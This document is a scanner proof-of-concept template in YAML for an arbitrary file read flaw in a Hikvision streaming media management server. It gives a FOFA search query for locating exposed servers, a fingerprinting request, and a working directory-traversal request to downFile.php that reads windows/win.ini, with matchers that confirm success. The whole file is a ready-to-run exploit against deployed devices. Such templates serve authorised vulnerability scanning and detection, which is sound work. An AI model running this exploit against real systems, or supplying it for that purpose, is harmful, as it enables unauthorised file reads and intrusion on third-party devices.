id: poc-yaml-hikvision-streaming-media-anyfile-read
info:
  name: 海康威视 流媒体管理服务器任意文件读取漏洞
  severity: high
  tags:
  - 目录遍历
  finger: 流媒体管理服务器
  fofa: body="杭州海康威视系统技术有限公司 版权所有" && title="流媒体管理服务器"
requests:
- method: GET
  path: /
  expression: status_code == 200 && ( contains(body,"<TITLE>流媒体管理服务器</TITLE>") ||
    contains(body,"Video Transmission Management Server") )
- method: GET
  path: /systemLog/downFile.php?fileName=../../../../../../../../../../../../../../../windows/win.ini
  expression: status_code == 200 && contains(body,"bit app support") && contains(body,"[files]")
    && !contains(body,"<") && contains(headers,"filename=../../../../../../../../../../../../../../../windows/win.ini")
variables: {}
transport: http
